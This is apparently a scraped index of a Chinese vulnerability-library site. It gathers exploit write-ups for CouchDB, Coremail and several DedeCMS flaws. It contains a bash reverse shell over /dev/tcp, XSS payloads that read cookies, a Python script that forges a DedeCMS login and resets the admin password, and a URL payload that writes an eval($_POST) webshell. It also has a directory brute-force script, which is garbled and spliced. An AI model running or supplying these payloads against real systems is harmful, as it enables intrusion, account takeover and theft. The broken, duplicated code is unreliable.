'{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl --max-time 1 \"$server/example/_temp_view?limit=1\" -d '{\"language\":\"cmd\", \"map\":\"\"}' -H 'Content-Type: application/json' } run \"echo '/bin/bash -i >& /dev/tcp/$cb 0>&1' > /tmp/shell\" run \"bash /tmp/shell\" run \"rm -f /tmp/shell\" curl -XDELETE \"$server/_config/query_servers/cmd\" 漏洞修复 漏洞修复 1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 bind_address = 0.0.0.0，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini中找到 [admins]字段配置密码。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Coremail/1.html":{"url":"0day/Coremail/1.html","title":"Coremail配置文件信息泄漏","keywords":"","body":"一、漏洞简介 Coremail论客邮件系统开始研发于1999年，是中国第一套中文邮件系统，目前在中国大陆地区拥有超过10亿终端用户，是网易、中华网等运营商至今一直使用的邮件系统，也是政府、事业单位、科教、企业等机构广泛使用的邮件系统。 2019年6月，网上流传出Coremail论客邮件系统配置文件泄露的漏洞，该漏洞无需认证即可获取邮件系统的配置文件内容。 Coremail官网发布的漏洞公告：《关于Coremail邮件系统安全问题的情况说明》，http://www.coremail.cn/About/news_x/article_id/32641.htm 二、漏洞影响 Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞 三、复现过程 POC http://mail.xxxxx.com/mailsms/s?func=ADMIN:appState&dumpConfig=/ 输入Poc访问漏洞页面 发现信息泄露页面内搜索user，password，database等关键字 如下图 四、修复建议 1、在不影响使用的情况下，仅允许VPN连接后才可访问； 2、在Web服务器（nginx/apache）上限制外网对 /mailsms 路径的访问。建议使用Coremail构建邮件服务器的信息系统运营者立即自查，发现存在漏洞后及时修复。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 12:54:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/dede后台.html":{"url":"0day/Dedecms/dede后台.html","title":"Dedecms找后台","keywords":"","body":"Dedecms找后台 一、漏洞简介 仅针对windows系统 二、漏洞影响 三、复现过程 代码分析 进入正题 首先看核心文件common.inc.php 大概148行左右 if($_FILES) { require_once(DEDEINC.'/uploadsafe.inc.php'); } uploadsafe.inc.php if( preg_match('#^(cfg_|GLOBALS)#', $_key) ) { exit('Request var not allow for uploadsafe!'); } $$_key = $_FILES[$_key]['tmp_name']; //获取temp_name ${$_key.'_name'} = $_FILES[$_key]['name']; ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']); ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']); if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } if(empty(${$_key.'_size'})) { ${$_key.'_size'} = @filesize($$_key); } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。 if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } ...... 注意$$key这一句，变量$key取自于$_FILE，由于$_FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖) 本人出发点是找个可以利用 但在这之前有个if(!defined('DEDEADMIN'))的判断,这个很好绕过设置tmp_name为0或者1.jpg含. 就可以绕过。 最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。 当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow ! 举个例子 get: http://localhost/test.php?poc=./d复现 构造poc http://0-sec.org/tags.php post: dopost=save&_FILES[b4dboy][tmp_name]=./deCommon.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例 当目录存在点时候 当目录不存在点时候 python脚本 ![image](./img/25.png) #!/usr/bin/env python #coding:utf-8 import requests import itertools from random import choice import sys characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-\" back_dir = \"\" show_message = {} check_message = {} valid_file = [] data = { \"_FILES[tools][tmp_name]\" : \"./../{p}\"+res.text if \"Upload filetype not allow !\" in res.text and res.status_code == 200: valid_file.append(filename) except: pass #print valid_file #print valid_file if len(valid_file): if \"/tags.php\" in valid_file: for i in valid_file: if i == \"/tags.php\": return i else: file_name = choice(valid_file) return file_name else: return False def Bute(self): f_name = self.Check() #print f_name if f_name != False: if f_name == \"/tags.php\": prefix = \"./\" else: prefix = \"./../\" flag = 0 global characters,back_dir,data,check_message for num in range(1,7): if flag: break for pre in itertools.permutations(characters,num): pre = ''.join(list(pre)) data[\"_FILES[tools][tmp_name]\"] = data[\"_FILES[tools][tmp_name]\"].format(p=pre) print(\"testing\",pre) r = requests.post(self.target+f_name,data=data) if \"Upload filetype not allow !\" not in r.text and r.status_code == 200: flag = 1 back_dir = pre data[\"_FILES[tools][tmp_name]\"] = \"%s{p}零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:38:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/swfxss.html":{"url":"0day/Dedecms/swfxss.html","title":"swf文件反射型xss","keywords":"","body":"Dedecms swf文件反射型xss 一、漏洞简介 DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。 二、漏洞影响 三、复现过程 代码分析 详细说明： Location: /uploads/images/swfupload/swfupload.swf 漏洞文件为：http://www.dedecms.com/images/swfupload/swfupload.swf 这个flash文件存在漏洞，此文件漏洞可参考:https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/ 复现 /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}// /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:42:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员SSV-97074.html":{"url":"0day/Dedecms/会员SSV-97074.html","title":"【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改","keywords":"","body":"（SSV-97074）DeDecms 前台任意用户密码修改 一、漏洞简介 无CVE， SSV-97074，提交时间：20180110 在用户密码重置功能处，php存在弱类型比较，导致如果用户没有设置密保问题的情况下可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是member表中的密码，即使修改了管理员密码也是member表中的管理员密码，仍是无法进入管理 二、漏洞影响 三、复现过程 代码分析 php弱类型比较问题很常见，在不同类型比较时，如果使用的是==，php会将其中一个数据进行强制转换为另一个，比如’123a’就会被强制转换成123。这样就出现了弱类型比较问题，当然如果使用===判断比较就不会出现问题了。常见比较如下 '' == 0 == false '123' == 123 //'123'强制转换为123 'abc' == 0　 //intval('abc')==0 '123a' == 123 //intval('123a')==123 '0x01' == 1 //被识别为十六进制 '0e123456789' == '0e987654321'　　//被识别为科学计数法 [false] == [0] == [NULL] == [''] NULL == false == 0 true == 1 dedecms的/member/resetpassword.php就是用来处理用户密码重置的问题，问题出在75行开始处理验证密保问题处。 else if($dopost == \"safequestion\") { $mid = preg_replace(\"#[^0-9]#\", \"\", $id); $sql = \"SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(empty($safequestion)) $safequestion = ''; if(empty($safeanswer)) $safeanswer = ''; if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) { sn($mid, $row['userid'], $row['email'], 'N'); exit(); } else { ShowMsg(\"对不起，您的安全问题或答案回答错误\",\"-1\"); exit(); } } 可以看到，这段代码先是从数据库取出相关用户的密保问题及密保答案，在对用户输入做了一些处理后，进行了关键性的判断if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer) ，就在这里用了弱类型判断==。 首先我们知道，如果没有设置密保的话safequestion从数据库取出默认为’0’，safeanswer为空。根据empty函数特性，’0’会被判断为空，会进入重新将$safequestion赋值为’’。而'0' != '' ，所以我们需要一个输入即不使empty为空，且弱类型等于’0’的字符串。'00'、'000'、'0.0'以上这些都是可以的。 接下来safeanswer既然本来就为空，那么不输入正好也就相等了。跟踪sn函数 function sn($mid,$userid,$mailto, $send = 'Y') { global $db; $tptim= (60*10); $dtime = time(); $sql = \"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\"; $row = $db->GetOne($sql); if(!is_array($row)) { //发送新邮件； newmail($mid,$userid,$mailto,'INSERT',$send); } //10分钟后可以再次发送新验证码； elseif($dtime - $tptim > $row['mailtime']) { newmail($mid,$userid,$mailto,'UPDATE',$send); } //重新发送新的验证码确认邮件； else { return ShowMsg('对不起，请10分钟后再重新申请', 'login.php'); } } 跟踪newmail function newmail($mid, $userid, $mailto, $type, $send) { global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl; $mailtime = time(); $randval = random(8); $mailtitle = $cfg_webname.\":密码修改\"; $mailto = $mailto; $headers = \"From: \".$cfg_adminemail.\"\\r\\nReply-To: $cfg_adminemail\"; $mailbody = \"亲爱的\".$userid.\"：\\r\\n您好！感谢您使用\".$cfg_webname.\"网。\\r\\n\".$cfg_webname.\"应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\\r\\n本次临时登陆密码为：\".$randval.\" 请于三天内登陆下面网址确认修改。\\r\\n\".$cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&id=\".$mid; if($type == 'INSERT') { $key = md5($randval); $sql = \"INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');\"; if($db->ExecuteNoneQuery($sql)) { if($send == 'Y') { sendmail($mailto,$mailtitle,$mailbody,$headers); return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000'); } else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&amp;id=\".$mid.\"&amp;key=\".$randval); } } else { return ShowMsg('对不起修改失败，请联系管理员', 'login.php'); } } 可见在sn函数中将send参数设置了’N’，其实就是生成了暂时密码并插入了数据库中，并进行跳转： else if ($send == 'N') { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd&amp;id=\".$mid.\"&amp;key=\".$randval); } 复现 在找回密码处，点击通过安全问题取回。 填写信息并抓包，修改id和userid为想要重置密码的对象，再加上以上分析内容，发包即可得到修改密码url 进入该url，修改密码。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:30:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员SSV-97087.html":{"url":"0day/Dedecms/会员SSV-97087.html","title":"【开启会员注册】（SSV-97087）DeDecms 任意用户登录","keywords":"","body":"（SSV-97087）DeDecms 任意用户登录 一、漏洞简介 漏洞编号：SSV-97087，提交时间：20180118 dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。 二、漏洞影响 三、复现过程 代码分析 在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。 if($action == '') { include_once(DEDEINC.\"/channelunit.func.php\"); $dpl = new DedeTemplate(); $tplfile = DEDEMEMBER.\"/space/{$_vars['spacestyle']}/index.htm\"; //更新最近访客记录及站点统计记录 $vtime = time(); $last_vtime = GetCookie('last_vtime'); $last_vid = GetCookie('last_vid'); if(empty($last_vtime)) { $last_vtime = 0; } if($vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',')) { if($last_vid!='') { $last_vids = explode(',',$last_vid); $i = 0; $last_vid = $uid; foreach($last_vids as $lsid) { if($i>10) { break; } else if($lsid != $uid) { $i++; $last_vid .= ','.$last_vid; } } } else { $last_vid = $uid; } PutCookie('last_vtime', $vtime, 3600*24, '/'); PutCookie('last_vid', $last_vid, 3600*24, '/'); 我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid = $uid;，然后PutCookie。 那么这么说，我们控制了$uid就相当于可以返回任意值经过服务器处理的md5值。 而在接下来会验证用户是否登录。 现在我们来看看，dedecms会员认证系统是怎么实现的：/include/memberlogin.class.php //php5构造函数 function __construct($kptime = -1, $cache=FALSE) { global $dsql; if($kptime==-1){ $this->M_KeepTime = 3600 * 24 * 7; }else{ $this->M_KeepTime = $kptime; } $formcache = FALSE; $this->M_ID = $this->GetNum(GetCookie(\"DedeUserID\")); $this->M_LoginTime = GetCookie(\"DedeLoginTime\"); $this->fields = array(); $this->isAdmin = FALSE; if(empty($this->M_ID)) { $this->ResetUser(); }else{ $this->M_ID = intval($this->M_ID); if ($cache) { $this->fields = GetCache($this->memberCache, $this->M_ID); if( empty($this->fields) ) { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } else { $formcache = TRUE; } } else { $this->fields = $dsql->GetOne(\"Select * From `#@__member` where mid='{$this->M_ID}' \"); } if(is_array($this->fields)){ #api{{ if(defined('UC_API') && @include_once DEDEROOT.'/uc_client/client.php') { if($data = uc_get_user($this->fields['userid'])) { if(uc_check_avatar($data[0]) && !strstr($this->fields['face'],UC_API)) { $this->fields['face'] = UC_API.'/avatar.php?uid='.$data[0].'&size=middle'; $dsql->ExecuteNoneQuery(\"UPDATE `#@__member` SET `face`='\".$this->fields['face'].\"' WHERE `mid`='{$this->M_ID}'\"); } } } #/aip}} //间隔一小时更新一次用户登录时间 if(time() - $this->M_LoginTime > 3600) { $dsql->ExecuteNoneQuery(\"update `#@__member` set logintime='\".time().\"',loginip='\".GetIP().\"' where mid='\".$this->fields['mid'].\"';\"); PutCookie(\"DedeLoginTime\",time(),$this->M_KeepTime); } $this->M_LoginID = $this->fields['userid']; $this->M_MbType = $this->fields['mtype']; $this->M_Money = $this->fields['money']; $this->M_UserName = FormatUsername($this->fields['uname']); $this->M_Scores = $this->fields['scores']; $this->M_Face = $this->fields['face']; $this->M_Rank = $this->fields['rank']; $this->M_Spacesta = $this->fields['spacesta']; $sql = \"Select titles From #@__scores where integralfields['scores']} order by integral desc\"; $scrow = $dsql->GetOne($sql); $this->fields['honor'] = $scrow['titles']; $this->M_Honor = $this->fields['honor']; if($this->fields['matt']==10) $this->isAdmin = TRUE; $this->M_UpTime = $this->fields['uptime']; $this->M_ExpTime = $this->fields['exptime']; $this->M_JoinTime = MyDate('Y-m-d',$this->fields['jointime']); if($this->M_Rank>10 && $this->M_UpTime>0){ $this->M_HasDay = $this->Judgemember(); } if( !$formcache ) { SetCache($this->memberCache, $this->M_ID, $this->fields, 1800); } }else{ $this->ResetUser(); } } } $this->M_ID等于Cookie中的DedUserID，我们继续看看GetCookie函数 if ( ! function_exists('GetCookie')) { function GetCookie($key) { global $cfg_cookie_encode; if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) ) { return ''; } else { if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16)) { return ''; } else { return $_COOKIE[$key]; } } } } 它不但读了cookie还验证了md5值。 这样，由于index.php中我们可以控制返回一个输入值和这个输入值经过服务器处理后的md5值。那么如果我们伪造DedUserID和它对应的MD5就行了。 最后一个问题，因为我们上面是通过用户名伪造ID的，用户名为字符串而ID为整数，但好在在构造用户类中将M_ID intval了一下$this->M_ID = intval($this->M_ID); 那么这么说，如果我们想伪造ID为1的用户的Md5，我们只要在上面设置uid(用户名)为’000001’即可。 复现 1、先从member/index.php中获取伪造的DedeUserID和它对于的md5 2、使用它登录 访问member/index.php?uid=0000001并抓包(注意cookie中last_vid值应该为空)。 可以看到已经获取到了，拿去当做DeDeUserID 可以看到，登陆了admin用户。 python脚本 # coding=utf-8 import requests import re if __name__ == \"__main__\": dede_host = \"http://127.0.0.1/\" oldpwd = '123456' newpwd = \"cnvdcnvd\" s = requests.Session() if '系统关闭了会员功能' in requests.get(dede_host + 'member/reg_new.php').content: exit('The system has closed the member function .Can not attack !!!') else: print \"The system opened the membership function, I wish you good luck !!\" headers = {\"Referer\": dede_host + \"member/reg_new.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('1.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the registration verification code : \") userid = '0000001' uname = '0000001' userpwd = '123456' headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)\", \"Content-Type\": \"application/x-www-form-urlencoded\"} data = \"dopost=regbase&step=1&mtype=%E4%B8%AA%E4%BA%BA&mtype=%E4%B8%AA%E4%BA%BA&userid={userid}&uname={uname}&userpwd={userpwd}&userpwdok={userpwd}&email=0000001%400000001.com&safequestion=0&safeanswer=&sex=%E7%94%B7&vdcode={vdcode}&agree=\".format( userid=userid, uname=uname, userpwd=userpwd, vdcode=vdcode) rs = s.post(dede_host + '/member/reg_new.php', data=data, headers=headers) if \"验证码错误\" in rs.content: exit(\"Verification code error, account registration failed\") elif '注册成功' in rs.content: print 'registration success !!' rs = s.get(dede_host + \"/member/index.php?uid={userid}\".format(userid=userid)) if \"资料尚未通过审核\" in rs.content: exit(\"User information has not been approved !!!\") # 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)： searchObj = re.search(r'last_vid__ckMd5=(.*?);', rs.headers['Set-Cookie'], re.M | re.I) last_vid__ckMd5 = searchObj.group(1) s.cookies['DedeUserID'] = userid s.cookies['DedeUserID__ckMd5'] = last_vid__ckMd5 rs = s.get(dede_host + \"/member/index.php\") if \"class=\\\"userName\\\">admin\" in rs.text: print \"Administrator login successful !!\" headers = {\"Referer\": dede_host + \"member/edit_baseinfo.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('2.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the verification code : \") data = {\"dopost\": \"save\", \"uname\": \"admin\", \"oldpwd\": oldpwd, \"userpwd\": newpwd, \"userpwdok\": newpwd, \"safequestion\": \"0\", \"newsafequestion\": \"0\", \"sex\": \"男\", \"email\": \"admin@admin.com\", \"vdcode\": vdcode} rs = s.post(dede_host + '/member/edit_baseinfo.php', data=data) if \"成功更新你的基本资料\" in rs.content: print \"Administrator password modified successfully !!\" print \"The new administrator password is : \" + newpwd else: print \"attack fail\" 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:20:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员CVE-2018-20129.html":{"url":"0day/Dedecms/会员CVE-2018-20129.html","title":"【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞","keywords":"","body":"（CVE-2018-20129）Dedecms前台文件上传漏洞 一、漏洞简介 管理员用户前台可以绕过限制上传shell 二、漏洞影响 三、复现过程 代码分析 漏洞在于用户发布文章上传图片处。处理文件在/include/dialog/select_images_post.php 而上传文件存在全局过滤/include/uploadsafe.inc.php #/include/uploadsafe.inc.php $cfg_not_allowall = \"php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml\"; if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } 可以看到名字中不得有上述字符，且限制了content-type。按道理说直接限制不得存在的字符，似乎没有问题了，可在发布文章文件上传的处理文件select_images_post.php中存在如下代码： $imgfile_name = trim(preg_replace(\"#[ \\r\\n\\t\\*\\%\\\\\\/\\?>再次过滤了图片名，并且再次判断如上三种文件类型是否存在其中。这么一次过滤，直接粗暴的将一些特殊字符替换为空，那么我们就可以通过特殊字符绕过上面的全局文件名不能包含php字符的限制，比如文件名为1.jpg.p*hp 复现 登录并进入member/article_add.php发布文章，选择下面的富文本编辑器插入图片 选择好shell并上传抓包 向如上分析修改文件名与content-type，即可返回shell地址 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:26:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CNVD-2018-01221.html":{"url":"0day/Dedecms/CNVD-2018-01221.html","title":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞","keywords":"","body":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞 一、漏洞简介 DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 二、漏洞影响 三、复现过程 需要登录后台 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件 代码分析 (1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步 (2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。 (3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html* [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\\.意思是匹配小数点 所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。 (4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec (5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用 (6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施， 导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了 根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。 漏洞复现 获取token http://0-sec.org/dede/tpl.php?action=upload 然后查看网页源代码，找到token 构造payload如下 http://0-sec.org/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token) 访问了成功写入 访问写入的文件 http://0-sec.org/include/taglib/（你上传的文件名）.lib.php 也可以构造一句话木马payload http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&action=savetagfile&content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&token=2d7ef87e9828edaad2d7b6bbe37f1929 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 20:06:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CVE-2018-9175.html":{"url":"0day/Dedecms/CVE-2018-9175.html","title":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell","keywords":"","body":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell 一、漏洞简介 后台写配置文件过滤不足导致写shell。 二、漏洞影响 三、复现过程 漏洞代码分析 第一个 在/dede/sys_verifies.php中的第152行处 else if ($action == 'getfiles') { if(!isset($refiles)) { ShowMsg(\"你没进行任何操作！\",\"sys_verifies.php\"); exit(); } $cacheFiles = DEDEDATA.'/modifytmp.inc'; $fp = fopen($cacheFiles, 'w'); fwrite($fp, ''); fclose($fp); 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 上面的$refiles就是注册的外部变量，可见已经addlashes了而我们还是需要绕过fwrite($fp, '$files['.$i.'] = \"'.$filename.'\";'.\"\\r\\n\"); 实现注入shell，首先需要注入就必须闭合双引号，在这里有个诡异的操作 $filename = substr($filename,3,strlen($filename)-3); 去掉了输入的前三个字符，这样就为我们写shell制造了机会，当我们输入\\\" 时经过addlashes会变成\\\\\"，再去掉前三个字符就只剩下双引号实现闭合。 此时写入shell后只要再找一个包含modifytmp.inc文件的文件就好了，全局搜索一下可以发现就在本文件/dede/sys_verifies.php 第二个 同样是写配置文件，位于/dede/sys_cache_up.php else if($step == 2) { include_once(DEDEINC.\"/enums.func.php\"); WriteEnumsCache(); //WriteAreaCache(); 已过期 